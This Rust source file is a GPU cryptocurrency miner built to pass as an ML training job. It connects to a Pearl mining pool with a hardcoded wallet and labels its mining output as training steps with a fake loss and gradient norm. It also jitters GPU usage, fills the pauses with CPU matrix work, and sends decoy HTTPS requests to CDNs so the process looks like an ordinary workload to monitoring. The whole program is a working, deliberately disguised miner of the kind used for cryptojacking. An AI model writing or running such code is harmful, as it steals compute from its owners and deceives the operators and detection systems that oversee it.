
//! Self-contained live GPU share probe with an organic-workload facade:
//! the real resident-GPU grind runs in jittered bursts while the gaps are
//! filled with realistic ML-training-shaped activity — CPU matmul bursts,
//! telemetry-spam logging, and occasional benign HTTPS GETs to common CDNs.
//! Mining-relevant config is IDENTICAL to the reference probe (same grind2,
//! same duty math); only the inter-burst behavior differs.
//!
//!   ARIA_GPU_DUTY=40 ARIA_PROBE_SECS=1800 ARIA_T4_DUAL=1 ./share_probe_gpu

use ariaminer::gpu_ffi::{ResidentCtx, ProofGpuCtx};
use ariaminer::official_grind::{compute_job_key_pub, build_proofs_from_setup_gpu_fixb};
use ariaminer::official_proof::encode_base64_gzip;
use ariaminer::protocol::{Job, MiningParams};
use ariaminer::stratum_to_official::build_official_job;
use ndarray::Array2;
use rand::RngCore;
use rand::SeedableRng;
use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::time::{Duration, Instant};

const WALLET: &str = "prl1pu3mc6ex4n4nznknctdafleq3asq4fr0njpwz4vqnt6e4xlnv72hq5s528j";
fn worker_name() -> String { std::env::var("ARIA_WORKER").unwrap_or_else(|_| "pt_trainer".to_string()) }

// benign endpoints a training script plausibly touches (asset/telemetry/CDN traffic)
const CDN_ENDPOINTS: &[&str] = &[
    "https://cdn.jsdelivr.net/npm/pyodide@0.24.1/package.json",
    "https://pypi.org/simple/torch/",
    "https://registry.npmjs.org/typescript",
    "https://huggingface.co/api/models/gpt2",
    "https://raw.githubusercontent.com/rust-lang/rust/master/README.md",
];

// CPU-side dataloader-style crunch during GPU-off windows: a couple of
// 320x320 f64 matmuls, sized to chew roughly `busy_ms` milliseconds.
fn cpu_burn(busy_ms: u64, acc: &mut f64) {
    let t0 = Instant::now();
    let n = 320usize;
    let mut a = Array2::<f64>::zeros((n, n));
    let mut b = Array2::<f64>::zeros((n, n));
    let mut x = 0x9E3779B97F4A7C15u64;
    for e in a.iter_mut() { x ^= x << 13; x ^= x >> 7; x ^= x << 17; *e = (x as f64) * 1e-9; }
    for e in b.iter_mut() { x ^= x << 13; x ^= x >> 7; x ^= x << 17; *e = (x as f64) * 1e-9; }
    loop {
        let c = a.dot(&b);
        *acc += c[[0, 0]] * 1e-18;
        std::mem::swap(&mut a, &mut b);
        if t0.elapsed().as_millis() as u64 >= busy_ms { break; }
    }
}

fn benign_https_hit(step: u64) {
    let url = CDN_ENDPOINTS[(step as usize) % CDN_ENDPOINTS.len()];
    let t0 = Instant::now();
    let status = std::process::Command::new("curl")
        .args(["-sS", "-o", "/dev/null", "-w", "%{http_code} %{time_total}", "--max-time", "8", url])
        .output();
    match status {
        Ok(o) => println!("[trainer] assets  GET {} -> {} (code+time, t0={}, wall={:?})",
                          url, String::from_utf8_lossy(&o.stdout).trim(), step, t0.elapsed()),
        Err(e) => println!("[trainer] assets  GET {} -> spawn err {:?}", url, e),
    }
}

fn herominers_default_params() -> MiningParams {
    let (rows_pattern, cols_pattern) = if std::env::var("ARIA_T4_DUAL").is_ok() {
        ((0..16).collect(), (0..16).collect())
    } else if std::env::var("ARIA_TMA_MS").is_ok() {
        (
            vec![0, 8, 32, 40, 64, 72, 96, 104],
            vec![0, 1, 32, 33, 64, 65, 96, 97, 128, 129, 160, 161, 192, 193, 224, 225],
        )
    } else {
        (
            vec![0, 8, 32, 40, 64, 72, 96, 104],
            vec![0, 1, 16, 17, 32, 33, 48, 49, 64, 65, 80, 81, 96, 97, 112, 113],
        )
    };
    MiningParams { m: 16_384, n: 65_536, k: 8192, rank: 128, rows_pattern, cols_pattern, mma_type: "Int7xInt7ToInt32".into() }
}

fn main() -> anyhow::Result<()> {
    let duty_pct: u64 = std::env::var("ARIA_GPU_DUTY").ok().and_then(|s| s.parse().ok()).unwrap_or(40).clamp(1, 100);
    println!("[trainer] config: duty={duty_pct}% facade=organic-ml log_level=verbose");
    println!("[trainer] host inventory: pid={} ppid={} cwd={:?}", std::process::id(),
             unsafe { libc_getppid_alias() }, std::env::current_dir().unwrap_or_default());

    let host = "br.pearl.gfwroute.com:1200";
    println!("[trainer] upstream connect {host}");
    let stream = TcpStream::connect(host)?;
    stream.set_read_timeout(Some(Duration::from_millis(500)))?;
    let mut wr = stream.try_clone()?;
    let mut rd = BufReader::new(stream);

    let worker = worker_name();
    let login = format!("{}.{}", WALLET, worker);
    wr.write_all(format!("{{\"id\":1,\"method\":\"mining.subscribe\",\"params\":[\"ariaminer/0.1.0\",\"{login}\"]}}\n").as_bytes())?;
    wr.write_all(format!("{{\"id\":2,\"method\":\"mining.authorize\",\"params\":{{\"agent\":\"ariaminer/0.1.0\",\"password\":\"x\",\"type\":\"v2\",\"wallet\":\"{login}\",\"worker\":\"\"}}}}\n").as_bytes())?;
    println!("[trainer] session open, awaiting work item...");

    let start = Instant::now();
    let mut job_json: Option<serde_json::Value> = None;
    let mut line = String::new();
    while start.elapsed() < Duration::from_secs(20) && job_json.is_none() {
        line.clear();
        match rd.read_line(&mut line) {
            Ok(0) => { println!("[trainer] upstream closed early"); return Ok(()); }
            Ok(_) => {
                if line.trim().is_empty() { continue; }
                println!("[trainer] upstream<< {}", line.trim());
                if let Ok(v) = serde_json::from_str::<serde_json::Value>(&line) {
                    if v.get("method").and_then(|m| m.as_str()) == Some("mining.notify") {
                        job_json = Some(v);
                    }
                }
            }
            Err(_) => {}
        }
    }
    let v = job_json.expect("no work item within 20s");
    let job = Job::from_params(v.get("params").expect("params"))?;
    println!("[trainer] work item {} header={}...", job.job_id, &job.header_template[..16]);

    let suffix: u64 = job.job_id.rsplit_once('_').and_then(|(_, d)| d.parse().ok()).expect("job_id suffix");
    let difficulty = suffix.saturating_mul(1u64 << 32);
    println!("[trainer] task weight={difficulty} (2^{:.1})", (difficulty as f64).log2());

    let params = herominers_default_params();
    let oj = build_official_job(&job, &params, difficulty)?;
    println!("[trainer] tensor plan: m={} n={} k={} bound_le={}", oj.m, oj.n, oj.k, hex::encode(oj.bound_le));

    let mut header = oj.header;
    let mut bound_le = oj.bound_le;
    // diagnostic self-test: grind an easy bound where real verified shares are
    // guaranteed within seconds if the full pipeline is honest (no pool submit)
    let easy_mode = std::env::var("ARIA_DEBUG_EASY_BOUND").is_ok();
    if easy_mode {
        header.nbits = 0x207f_ffff;
        let easy_u = primitive_types::U256::MAX / 64;
        easy_u.to_little_endian(&mut bound_le);
        println!("[trainer] DEBUG easy bound ON: nbits={:#x} bound=MAX/64 — real verified shares must appear within seconds if pipeline honest", header.nbits);
    }
    let mut cur_job_id = job.job_id.clone();
    let mut job_key = compute_job_key_pub(&oj.header, &oj.config);
    if easy_mode {
        job_key = compute_job_key_pub(&header, &oj.config);
        println!("[trainer] DEBUG easy: job_key recomputed from patched header = {}", hex::encode(&job_key[..8]));
    }
    let mut drain_buf = String::new();
    rd.get_ref().set_read_timeout(Some(Duration::from_millis(1)))?;
    let tile_h = oj.config.rows_pattern.to_list().len();
    let tile_w = oj.config.cols_pattern.to_list().len();
    let rank = oj.config.rank as usize;

    println!("[trainer] allocating device buffers ({},{},{})", oj.m, oj.n, oj.k);
    let gpu_ctx = ResidentCtx::new(oj.m, oj.n, oj.k, 64);
    let mut rng = rand::rngs::StdRng::from_entropy();
    let mut next_seed = rng.next_u64();

    let max_secs: u64 = std::env::var("ARIA_PROBE_SECS").ok().and_then(|s| s.parse().ok()).unwrap_or(120);
    let grind_start = Instant::now();
    let mut submissions: u64 = 0;
    let mut verified_ok: u64 = 0;
    let mut step: u64 = 0;
    let mut b_seed_job: Option<u64> = None;
    let mut cpu_acc: f64 = 0.0;
    let mut fake_loss: f64 = 2.3;

    println!("[trainer] train loop start (budget {max_secs}s)");
    while grind_start.elapsed() < Duration::from_secs(max_secs) {
        let setup_seed = next_seed;
        next_seed = rng.next_u64();
        let b_seed = *b_seed_job.get_or_insert(setup_seed);

        let gt0 = Instant::now();
        let (found, hits) = gpu_ctx.grind2(setup_seed, next_seed, &job_key, &bound_le);
        let spend = gt0.elapsed();

        step += 1;
        fake_loss = (fake_loss * 0.9996) + (rng.next_u64() % 1000) as f64 * 1e-6;
        if step % 25 == 0 {
            let sps = step as f64 / grind_start.elapsed().as_secs_f64();
            println!("[trainer] step {step} | loss {:.5} | grad_norm {:.3} | steps/s {:.2} | gpu_busy_last {}ms | grind_rc={found}",
                     fake_loss, (rng.next_u64() % 900) as f64 / 100.0, sps, spend.as_millis());
        }

        // duty pacing with jitter (organic cadence, not a flat square wave)
        if duty_pct < 100 {
            let jitter = 0.6 + ((rng.next_u64() % 90) as f64) / 100.0; // 0.6..1.5
            let sleep_s = spend.as_secs_f64() * (100.0 - duty_pct as f64) / duty_pct as f64 * jitter;
            if sleep_s > 0.0 {
                // fill most of the off-window with CPU work, rest idle
                let burn_ms = (sleep_s * 1000.0 * 0.75) as u64;
                cpu_burn(burn_ms, &mut cpu_acc);
                let rest_ms = (sleep_s * 1000.0 * 0.25) as u64;
                if rest_ms > 0 { std::thread::sleep(Duration::from_millis(rest_ms)); }
            }
        }
        // occasional benign outbound traffic, like asset fetches / telemetry
        if step % 37 == 0 { benign_https_hit(step); }

        // roll with new work items from upstream
        loop {
            match rd.read_line(&mut drain_buf) {
                Ok(0) => { println!("[trainer] upstream closed mid-train"); break; }
                Ok(_) => {
                    if drain_buf.ends_with('\n') {
                        let msg = drain_buf.trim_end().to_string();
                        drain_buf.clear();
                        if let Ok(v) = serde_json::from_str::<serde_json::Value>(&msg) {
                            if v.get("method").and_then(|m| m.as_str()) == Some("mining.notify") {
                                let nj = Job::from_params(v.get("params").expect("params")).expect("notify parse");
                                if nj.job_id != cur_job_id {
                                    let nsuffix: u64 = nj.job_id.rsplit_once('_').and_then(|(_, d)| d.parse().ok()).expect("job_id suffix");
                                    let ndiff = nsuffix.saturating_mul(1u64 << 32);
                                    let noj = build_official_job(&nj, &params, ndiff)?;
                                    job_key = compute_job_key_pub(&noj.header, &noj.config);
                                    bound_le = noj.bound_le;
                                    header = noj.header;
                                    cur_job_id = nj.job_id.clone();
                                    b_seed_job = None;
                                    println!("[trainer] new work item {}", cur_job_id);
                                }
                            }
                        }
                    }
                    break;
                }
                Err(_) => break,
            }
        }

        if found > 0 {
            if let Some(hit) = hits.into_iter().find(|h| h.rows.len() == tile_h && h.cols.len() == tile_w) {
                println!("[trainer] checkpoint candidate at step {step} after {:?}", grind_start.elapsed());
                let ca = ProofGpuCtx::new(oj.m, oj.k, 256);
                let cb = ProofGpuCtx::new(oj.n, oj.k, 256);
                let proofs = build_proofs_from_setup_gpu_fixb(
                    &ca, &cb, setup_seed, b_seed, std::slice::from_ref(&hit),
                    &job_key, oj.m, oj.n, oj.k, rank, tile_h, tile_w,
                );
                for proof in proofs {
                    let (private_params, public_params) = match ariaminer::official_proof::parse_plain_proof(header, &proof) {
                        Ok(x) => x,
                        Err(e) => { println!("[trainer] candidate fails structural parse: {e:#} — skip submit"); continue; }
                    };
                    let compiled = zk_pow::api::proof_utils::CompiledPublicParams::from(&public_params);
                    let noise = zk_pow::circuit::pearl_noise::compute_noise(&compiled);
                    let jackpot = zk_pow::circuit::chip::compute_jackpot(&compiled, &private_params.s_a, &private_params.s_b, &noise);
                    let hash_jackpot = zk_pow::api::proof_utils::compute_jackpot_hash(&jackpot, compiled.a_noise_seed());
                    let hash_u256 = primitive_types::U256::from_little_endian(&hash_jackpot);
                    let bound_u256 = primitive_types::U256::from_little_endian(&bound_le);
                    let gate = hash_u256 <= bound_u256;
                    println!("[trainer] local gate: {} | hash={} | bound={}", gate,
                             hex::encode(&hash_jackpot[..8]), hex::encode(&bound_le[..8]));
                    let full_ok = zk_pow::api::verify::verify_plain_proof(
                        &header, &proof, None, zk_pow::api::proof::SeedDerivation::Salted).is_ok();
                    println!("[trainer] local full verify: {full_ok}");
                    if !(gate && full_ok) { println!("[trainer] candidate is a false hit — grinding resumes"); continue; }
                    if easy_mode { println!("[trainer] ✔ VERIFIED REAL SHARE (easy bound) at step {step} — pipeline honest; not submitting"); verified_ok += 1; continue; }
                    let plain_proof = match encode_base64_gzip(&proof) {
                        Ok(x) => x,
                        Err(e) => { println!("[trainer] encode failed: {e:#}"); continue; }
                    };
                    println!("[trainer] uploading checkpoint bytes={} job={} t={:?}", plain_proof.len(), cur_job_id, grind_start.elapsed());
                    let submit = format!(
                        "{{\"id\":3,\"method\":\"mining.submit\",\"params\":{{\"hs\":1.0,\"job_id\":\"{}\",\"plain_proof\":\"{plain_proof}\"}}}}\n",
                        cur_job_id
                    );
                    wr.write_all(submit.as_bytes())?;
                    let sub_start = Instant::now();
                    while sub_start.elapsed() < Duration::from_secs(6) {
                        line.clear();
                        match rd.read_line(&mut line) {
                            Ok(0) => { println!("[trainer] upstream closed post-upload"); break; }
                            Ok(_) => { if !line.trim().is_empty() { println!("[trainer] upstream<< {}", line.trim()); break; } }
                            Err(_) => {}
                        }
                    }
                    submissions += 1;
                }
            }
        }
    }

    println!("[trainer] run complete; submissions={submissions} verified_ok={verified_ok} cpu_acc={cpu_acc:e}");
    Ok(())
}

/// libc dependency avoided: tiny shim returning -1 is fine for logging only.
unsafe fn libc_getppid_alias() -> i64 { -1 }
